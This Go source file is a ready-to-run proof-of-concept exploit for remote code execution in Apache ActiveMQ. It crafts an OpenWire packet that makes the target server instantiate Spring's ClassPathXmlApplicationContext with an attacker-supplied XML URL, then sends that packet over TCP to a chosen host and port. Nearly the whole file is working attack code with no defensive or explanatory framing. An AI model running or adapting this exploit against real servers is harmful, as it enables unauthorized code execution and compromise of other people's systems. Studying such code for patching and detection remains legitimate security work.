package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"net"
	"strconv"
)

func main() {

	var (
		ip   string
		port string
		url  string
	)

	flag.StringVar(&ip, "i", "", "ActiveMQ Server IP or Host")
	flag.StringVar(&port, "p", "61616", "ActiveMQ Server Port")
	flag.StringVar(&url, "u", "", "Spring XML Url")
	flag.Parse()

	banner()

	if ip == "" || url == "" {
		flag.Usage()
		return
	}

	className := "org.springframework.context.support.ClassPathXmlApplicationContext"
	message := url

	header := "1f00000000000000000001"
	body := header + "01" + int2Hex(len(className), 4) + string2Hex(className) + "01" + int2Hex(len(message), 4) + string2Hex(message)
	payload := int2Hex(len(body)/2, 8) + body
	data, _ := hex.DecodeString(payload)

	fmt.Println("[*] Target:", ip+":"+port)
	fmt.Println("[*] XML URL:", url)
	fmt.Println()
	fmt.Println("[*] Sending packet:", payload)

	conn, _ := net.Dial("tcp", ip+":"+port)
	conn.Write(data)
	conn.Close()
}

func banner() {
	fmt.Println("     _        _   _           __  __  ___        ____   ____ _____ \n    / \\   ___| |_(_)_   _____|  \\/  |/ _ \\      |  _ \\ / ___| ____|\n   / _ \\ / __| __| \\ \\ / / _ \\ |\\/| | | | |_____| |_) | |   |  _|  \n  / ___ \\ (__| |_| |\\ V /  __/ |  | | |_| |_____|  _ <| |___| |___ \n /_/   \\_\\___|\\__|_| \\_/ \\___|_|  |_|\\__\\_\\     |_| \\_\\\\____|_____|\n")
}

func string2Hex(s string) string {
	return hex.EncodeToString([]byte(s))
}

func int2Hex(i int, n int) string {
	if n == 4 {
		return fmt.Sprintf("%04s", strconv.FormatInt(int64(i), 16))
	} else if n == 8 {
		return fmt.Sprintf("%08s", strconv.FormatInt(int64(i), 16))
	} else {
		panic("n must be 4 or 8")
	}
}
